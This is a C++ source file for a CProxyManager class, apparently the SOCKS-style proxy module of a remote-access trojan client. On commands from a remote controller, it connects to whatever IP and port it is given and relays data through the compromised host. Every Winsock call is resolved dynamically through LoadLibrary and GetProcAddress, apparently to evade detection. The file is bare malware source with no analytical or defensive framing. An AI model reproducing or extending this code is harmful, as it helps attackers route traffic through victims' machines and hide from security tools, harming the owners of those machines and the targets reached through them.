// ProxyManager.cpp: implementation of the CProxyManager class.
//////////////////////////////////////////////////////////////////////

#include "ProxyManager.h"
#include <MSTcpIP.h>
#include <TCHAR.h>

//#define SAFE_CLOSESOCKET(s) if(s!=NULL && s!=INVALID_SOCKET) \
//							{ \
//								shutdown(s, SD_SEND); \
//								closesocket(s); \
//								s=NULL; \
//							}
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CProxyManager::CProxyManager(CClientSocket* pClient) :CManager(pClient)
{
	InitializeCriticalSection(&Sec);
	memset(m_Socket, 0, sizeof(m_Socket));
	m_nSend = 0;
	BYTE cmd = TOKEN_PROXY_START;
	Send(&cmd, 1);
}

CProxyManager::~CProxyManager()
{
	typedef int (WINAPI* CLOSES)(SOCKET s);
	HINSTANCE ws2_32 = LoadLibrary(_T("ws2_32.dll"));
	CLOSES myclosesocket = (CLOSES)GetProcAddress(ws2_32, "closesocket");

	for (int i = 0; i < 10000; i++)
		if (m_Socket[i] && m_Socket[i] != INVALID_SOCKET)
		{
			myclosesocket(m_Socket[i]);
			m_Socket[i] = 0;
		}
	DeleteCriticalSection(&Sec);
	if (ws2_32)
		FreeLibrary(ws2_32);
}
int CProxyManager::Send(LPBYTE lpData, UINT nSize)
{
	int ret;
	EnterCriticalSection(&Sec);
	ret = CManager::Send(lpData, nSize);
	LeaveCriticalSection(&Sec);
	return ret;
}
void CProxyManager::SendErr(LPBYTE Msg)
{
	DWORD dwSize = lstrlen((LPCTSTR)Msg) + 2;
	LPBYTE lpBuffer = new BYTE[dwSize];
	lpBuffer[0] = TOKEN_EXCEPTION;
	lstrcpy((TCHAR*)lpBuffer + 1, (TCHAR*)Msg);
	Send(lpBuffer, dwSize);
	delete[] lpBuffer;
}
void CProxyManager::SendConnectResult(LPBYTE lpBuffer, DWORD ip, USHORT port)
{
	lpBuffer[0] = TOKEN_PROXY_CONNECT_RESULT;
	*(DWORD*)&lpBuffer[5] = ip;
	*(USHORT*)&lpBuffer[9] = port;
	Send(lpBuffer, 11);
}
void CProxyManager::Disconnect(DWORD index)
{
	BYTE buf[5];
	buf[0] = TOKEN_PROXY_CLOSE;
	memcpy(&buf[1], &index, sizeof(DWORD));
	Send(buf, sizeof(buf));

	typedef int (WINAPI* CLOSES)(SOCKET s);
	HINSTANCE ws2_32 = LoadLibrary(_T("ws2_32.dll"));
	CLOSES myclosesocket = (CLOSES)GetProcAddress(ws2_32, "closesocket");

	myclosesocket(m_Socket[index]);

	if (ws2_32)
		FreeLibrary(ws2_32);
}
void CProxyManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	typedef int (WINAPI* CLOSES)(SOCKET s);
	HINSTANCE ws2_32 = LoadLibrary(_T("ws2_32.dll"));
	CLOSES myclosesocket = (CLOSES)GetProcAddress(ws2_32, "closesocket");

	switch (lpBuffer[0])
	{
		/*[1]----[4]----[4]----[2]
		cmd		 id		ip		port*/
	case COMMAND_PROXY_CONNECT:
		//m_Socket[m_Index]=sock;
		SocksThreadArg arg;
		arg.pThis = this;
		arg.lpBuffer = lpBuffer;
		CloseHandle(MyCreateThread(NULL, 0, (unsigned long(__stdcall*)(void*))SocksThread, (LPVOID)&arg, 0, NULL));
		while (arg.lpBuffer)
			Sleep(2);
		break;
	case COMMAND_PROXY_CLOSE:
		myclosesocket(m_Socket[*(DWORD*)&lpBuffer[1]]);

		//		SAFE_CLOSESOCKET(m_Socket[*(DWORD*)&lpBuffer[1]]);
		break;
	case COMMAND_PROXY_DATA:
		DWORD index = *(DWORD*)&lpBuffer[1];
		DWORD nRet, nSend = 5, nTry = 0;
		while (m_Socket[index] && (nSend < nSize) && nTry < 15)
		{
			typedef BOOL(WINAPI* SEND)(SOCKET s, const char* buf, int len, int flags);
			SEND mysend;
			HINSTANCE hdlldw = LoadLibrary(_T("ws2_32.dll"));;
			mysend = (SEND)GetProcAddress(hdlldw, "send");

			nRet = mysend(m_Socket[index], (char*)&lpBuffer[nSend], nSize - nSend, 0);
			if (nRet == SOCKET_ERROR)
			{
				nRet = GetLastError();
				Disconnect(index);
				break;
			}
			else
			{
				nSend += nRet;
			}
			nTry++;
		}
	}
	if (ws2_32)
		FreeLibrary(ws2_32);
}
static DWORD WINAPI SocksThread(LPVOID lparam)
{
	SocksThreadArg* pArg = (SocksThreadArg*)lparam;
	CProxyManager* pThis = pArg->pThis;
	BYTE lpBuffer[11];
	SOCKET* psock;
	//	char chOpt;
	DWORD ip;
	sockaddr_in  sockAddr;
	int nSockAddrLen;
	memcpy(lpBuffer, pArg->lpBuffer, 11);
	pArg->lpBuffer = 0;

	DWORD index = *(DWORD*)&lpBuffer[1];
	psock = &pThis->m_Socket[index];

	HINSTANCE ws2_32 = LoadLibrary(_T("ws2_32.dll"));

	typedef int (WINAPI* SOCKETS)(int af, int type, int protocol);
	SOCKETS mysocket = (SOCKETS)GetProcAddress(ws2_32, "socket");

	typedef int (WINAPI* RECV)(SOCKET s, char* buf, int len, int flags);
	RECV myrecv = (RECV)GetProcAddress(ws2_32, "recv");

	typedef BOOL(WINAPI* CONNECTS)(SOCKET s, const struct sockaddr* name, int namelen);
	CONNECTS myconnect = (CONNECTS)GetProcAddress(ws2_32, "connect");

	typedef BOOL(WINAPI* GSAN)(SOCKET s, struct sockaddr* name, int* namelen);
	GSAN mygetsockname = (GSAN)GetProcAddress(ws2_32, "getsockname");

	typedef int (WINAPI* SELECT)(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, const struct timeval* timeout);
	SELECT myselect = (SELECT)GetProcAddress(ws2_32, "select");

	*psock = mysocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*psock == SOCKET_ERROR)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		//SendErr("create socket error!\n");
		return 0;
	}
	ip = *(DWORD*)&lpBuffer[5];
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = *(u_short*)&lpBuffer[9];
	ClientAddr.sin_addr.S_un.S_addr = ip;

	if (myconnect(*psock, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		return 0;
	}



	memset(&sockAddr, 0, sizeof(sockAddr));
	nSockAddrLen = sizeof(sockAddr);
	mygetsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	if (sockAddr.sin_port == 0) sockAddr.sin_port = 1;
	pThis->SendConnectResult(lpBuffer, sockAddr.sin_addr.S_un.S_addr, sockAddr.sin_port);

	CClientSocket* pClient = pThis->m_pClient;
	BYTE buff[MAX_RECV_BUFFER];
	struct timeval timeout;
	SOCKET socket = *psock;
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(socket, &fdSocket);
	timeout.tv_sec = 0;                //等下select用到这个
	timeout.tv_usec = 10000;
	buff[0] = TOKEN_PROXY_DATA;
	memcpy(buff + 1, &index, 4);
	while (WaitForSingleObject(pClient->m_hEvent, 10) != WAIT_OBJECT_0)
	{
		fd_set fdRead = fdSocket;
		int nRet = myselect(NULL, &fdRead, NULL, NULL, &timeout);
		if (nRet == SOCKET_ERROR)
		{
			nRet = GetLastError();
			pThis->Disconnect(index);
			break;
		}
		if (nRet > 0)
		{
			int nSize = myrecv(socket, (char*)(buff + 5), sizeof(buff) - 5, 0);
			if (nSize <= 0)
			{
				pThis->Disconnect(index);
				break;
			}
			if (nSize > 0)
				pThis->Send(buff, nSize + 5);
		}
	}
	FD_CLR(socket, &fdSocket);
	if (ws2_32)
		FreeLibrary(ws2_32);
	return 0;
}